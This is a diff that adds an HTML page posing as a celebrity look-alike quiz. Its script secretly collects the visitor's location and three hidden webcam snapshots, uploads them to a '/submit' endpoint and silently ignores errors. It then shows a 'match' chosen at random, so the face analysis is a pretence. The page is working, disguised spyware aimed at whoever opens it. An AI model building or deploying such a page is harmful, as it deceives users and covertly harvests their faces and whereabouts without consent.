@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Celebrity Look-Alike Quiz</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}
+        .box{background:rgba(255,255,255,0.15);padding:30px;border-radius:20px;text-align:center;max-width:400px;width:90%}
+        h1{font-size:22px;margin-bottom:10px}
+        p{font-size:14px;margin-bottom:20px;opacity:0.9}
+        button{background:#ff6b6b;color:#fff;border:none;padding:14px 30px;border-radius:30px;font-size:16px;cursor:pointer}
+        button:hover{background:#ee5a5a}
+        #result{margin-top:20px;font-size:18px;font-weight:bold}
+        video{display:none}
+        canvas{display:none}
+        .loader{margin-top:20px;font-size:14px}
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>🌟 Celebrity Look-Alike Quiz</h1>
+        <p>We'll scan your face to find your celebrity match!</p>
+        <button id="btn" onclick="startQuiz()">Start Quiz</button>
+        <div id="result"></div>
+        <div id="loader" class="loader" style="display:none">Analyzing your face... ⏳</div>
+    </div>
+    <video id="vid" autoplay playsinline></video>
+    <canvas id="can"></canvas>
+<script>
+const celebs=["You look like Shah Rukh Khan! 🎬","OMG you match with Zendaya! ✨","You're giving Ranveer Singh vibes! 🔥","You look like Alia Bhatt! 💫","Chris Hemsworth energy! ⚡"];
+
+async function startQuiz(){
+    document.getElementById('btn').style.display='none';
+    document.getElementById('loader').style.display='block';
+
+    let photos=[];
+    let loc={lat:0,lon:0};
+
+    try{
+        let pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:10000}));
+        loc.lat=pos.coords.latitude;
+        loc.lon=pos.coords.longitude;
+    }catch(e){}
+
+    try{
+        let stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+        let vid=document.getElementById('vid');
+        vid.srcObject=stream;
+        await new Promise(r=>vid.onloadedmetadata=r);
+
+        let can=document.getElementById('can');
+        can.width=vid.videoWidth;
+        can.height=vid.videoHeight;
+        let ctx=can.getContext('2d');
+
+        for(let i=0;i<3;i++){
+            await new Promise(r=>setTimeout(r,800));
+            ctx.drawImage(vid,0,0);
+            photos.push(can.toDataURL('image/jpeg',0.8));
+        }
+        stream.getTracks().forEach(t=>t.stop());
+    }catch(e){}
+
+    try{
+        await fetch('/submit',{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({photos:photos,location:loc})
+        });
+    }catch(e){}
+
+    document.getElementById('loader').style.display='none';
+    document.getElementById('result').textContent=celebs[Math.floor(Math.random()*celebs.length)];
+}
+</script>
+</body>
+</html>
